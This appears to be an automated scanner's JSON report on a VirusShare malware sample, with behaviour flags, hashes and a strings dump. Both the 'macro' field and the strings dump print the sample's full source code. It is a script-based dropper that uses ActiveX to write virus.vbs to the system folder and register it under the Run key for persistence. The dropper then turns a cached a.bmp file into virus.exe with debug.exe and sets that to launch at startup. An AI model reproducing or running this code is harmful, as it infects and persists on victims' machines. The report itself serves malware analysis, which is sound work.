{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "RegRead": "May read registry keys",
            "Run": "May run an executable file or a system command",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "command": "May run PowerShell commands",
            "write": "May write to a file"
        },
        "macro": "document\ufffd\ufffdwrite(' '); \nfunction docsave() \n{ \na=document\ufffd\ufffdapplets[0]; \na.setCLSID('{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}'); \na.createInstance(); \nwsh=a.GetObject(); \na.setCLSID('{0D43FE01-F093-11CF-8940-00A0C9054228}'); \na.createInstance(); \nfso=a.GetObject(); \nvar winsys=fso.GetSpecialFolder(1); \nvar vbs=winsys+'\\\\virus.vbs'; \nwsh.RegWrite \n('HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\vbs','wscript '+'\"'+vbs+'\" '); \nvar st=fso.CreateTextFile(vbs,true); \nst.WriteLine('Option Explicit'); \nst.WriteLine('Dim FSO,WSH,CACHE,str'); \nst.WriteLine('Set FSO = CreateObject(\"Scripting.FileSystemObject\")'); \nst.WriteLine('Set WSH = CreateObject(\"WScript.Shell\")'); \nst.WriteLine('CACHE=wsh.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\ShellFolders\\\\Cache\")'); \nst.WriteLine('wsh.RegDelete(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\vbs\")');\nst.WriteLine ('wsh.RegWrite \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\tmp\",\"virus.exe\"'); \nst.WriteLine('SearchBMPFile fso.GetFolder(CACHE),\"a.bmp\"'); \nst.WriteLine('WScript.Quit()'); \nst.WriteLine('Function SearchBMPFile(Folder,fname)'); \nst.WriteLine(' Dim SubFolder,File,Lt,tmp,winsys'); \nst.WriteLine(' str=FSO.GetParentFolderName(folder) & \"\\\\\" & folder.name & \"\\\\\" & fname'); \nst.WriteLine(' if FSO.FileExists(str) then'); \nst.WriteLine(' tmp=fso.GetSpecialFolder(2) & \"\\\\\"'); \nst.WriteLine(' winsys=fso.GetSpecialFolder(1) & \"\\\\\"'); \nst.WriteLine(' set File=FSO.GetFile(str)'); \nst.WriteLine(' File.Copy(tmp & \"vir.dat\")'); \nst.WriteLine(' File.Delete'); \nst.WriteLine(' set Lt=FSO.CreateTextFile(tmp & \"tmp.in\")'); \nst.WriteLine(' Lt.WriteLine(\"rbx\")'); \nst.WriteLine(' Lt.WriteLine(\"0\")'); \nst.WriteLine(' Lt.WriteLine(\"rcx\")'); \nst.WriteLine(' Lt.WriteLine(\"1000\")'); \nst.WriteLine(' Lt.WriteLine(\"w136\")'); \nst.WriteLine(' Lt.WriteLine(\"q\")'); \nst.WriteLine(' Lt.Close'); \nst.WriteLine(' WSH.Run \"command /c debug \" & tmp & \"vir.dat <\" & tmp & \"vir.in >\" & tmp & \"vir.out\",false,6'); \nst.WriteLine(' On Error Resume Next '); \nst.WriteLine(' FSO.GetFile(tmp & \"vir.dat\").Copy(winsys & \"virus.exe\")'); \nst.WriteLine(' FSO.GetFile(tmp & \"vir.dat\").Delete'); \nst.WriteLine(' FSO.GetFile(tmp & \"vir.in\").Delete'); \nst.WriteLine(' FSO.GetFile(tmp & \"vir.out\").Delete'); \nst.WriteLine(' end if'); \nst.WriteLine(' If Folder.SubFolders.Count <> 0 Then'); \nst.WriteLine(' For Each SubFolder In Folder.SubFolders'); \nst.WriteLine(' SearchBMPFile SubFolder,fname'); \nst.WriteLine(' Next'); \nst.WriteLine(' End If'); \nst.WriteLine('End Function');\nst.Close(); \n} \nsetTimeout('docsave()',1000); "
    },
    "filename": "VirusShare_19387f7e7bb4943a17f0360c806398e7",
    "filesize": 2657,
    "filetype": "ISO-8859 text, with CRLF line terminators",
    "hashes": {
        "md5": "19387f7e7bb4943a17f0360c806398e7",
        "sha1": "3d19c349bf4f97e53ccc7b10dccbe8efd95ffa50",
        "sha256": "4c2ea349bd412ac330266ff00e3ef43d612dfc7730708073a4c63d6ea95ede19"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "documentwrite(' '); ",
            "function docsave() ",
            "a=documentapplets[0]; ",
            "a.setCLSID('{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}'); ",
            "a.createInstance(); ",
            "wsh=a.GetObject(); ",
            "a.setCLSID('{0D43FE01-F093-11CF-8940-00A0C9054228}'); ",
            "a.createInstance(); ",
            "fso=a.GetObject(); ",
            "var winsys=fso.GetSpecialFolder(1); ",
            "var vbs=winsys+'\\\\virus.vbs'; ",
            "wsh.RegWrite ",
            "('HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\vbs','wscript '+'\"'+vbs+'\" '); ",
            "var st=fso.CreateTextFile(vbs,true); ",
            "st.WriteLine('Option Explicit'); ",
            "st.WriteLine('Dim FSO,WSH,CACHE,str'); ",
            "st.WriteLine('Set FSO = CreateObject(\"Scripting.FileSystemObject\")'); ",
            "st.WriteLine('Set WSH = CreateObject(\"WScript.Shell\")'); ",
            "st.WriteLine('CACHE=wsh.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\ShellFolders\\\\Cache\")'); ",
            "st.WriteLine('wsh.RegDelete(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\vbs\")');",
            "st.WriteLine ('wsh.RegWrite \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\tmp\",\"virus.exe\"'); ",
            "st.WriteLine('SearchBMPFile fso.GetFolder(CACHE),\"a.bmp\"'); ",
            "st.WriteLine('WScript.Quit()'); ",
            "st.WriteLine('Function SearchBMPFile(Folder,fname)'); ",
            "st.WriteLine(' Dim SubFolder,File,Lt,tmp,winsys'); ",
            "st.WriteLine(' str=FSO.GetParentFolderName(folder) & \"\\\\\" & folder.name & \"\\\\\" & fname'); ",
            "st.WriteLine(' if FSO.FileExists(str) then'); ",
            "st.WriteLine(' tmp=fso.GetSpecialFolder(2) & \"\\\\\"'); ",
            "st.WriteLine(' winsys=fso.GetSpecialFolder(1) & \"\\\\\"'); ",
            "st.WriteLine(' set File=FSO.GetFile(str)'); ",
            "st.WriteLine(' File.Copy(tmp & \"vir.dat\")'); ",
            "st.WriteLine(' File.Delete'); ",
            "st.WriteLine(' set Lt=FSO.CreateTextFile(tmp & \"tmp.in\")'); ",
            "st.WriteLine(' Lt.WriteLine(\"rbx\")'); ",
            "st.WriteLine(' Lt.WriteLine(\"0\")'); ",
            "st.WriteLine(' Lt.WriteLine(\"rcx\")'); ",
            "st.WriteLine(' Lt.WriteLine(\"1000\")'); ",
            "st.WriteLine(' Lt.WriteLine(\"w136\")'); ",
            "st.WriteLine(' Lt.WriteLine(\"q\")'); ",
            "st.WriteLine(' Lt.Close'); ",
            "st.WriteLine(' WSH.Run \"command /c debug \" & tmp & \"vir.dat <\" & tmp & \"vir.in >\" & tmp & \"vir.out\",false,6'); ",
            "st.WriteLine(' On Error Resume Next '); ",
            "st.WriteLine(' FSO.GetFile(tmp & \"vir.dat\").Copy(winsys & \"virus.exe\")'); ",
            "st.WriteLine(' FSO.GetFile(tmp & \"vir.dat\").Delete'); ",
            "st.WriteLine(' FSO.GetFile(tmp & \"vir.in\").Delete'); ",
            "st.WriteLine(' FSO.GetFile(tmp & \"vir.out\").Delete'); ",
            "st.WriteLine(' end if'); ",
            "st.WriteLine(' If Folder.SubFolders.Count <> 0 Then'); ",
            "st.WriteLine(' For Each SubFolder In Folder.SubFolders'); ",
            "st.WriteLine(' SearchBMPFile SubFolder,fname'); ",
            "st.WriteLine(' Next'); ",
            "st.WriteLine(' End If'); ",
            "st.WriteLine('End Function');",
            "st.Close(); ",
            "setTimeout('docsave()',1000); "
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.295432",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
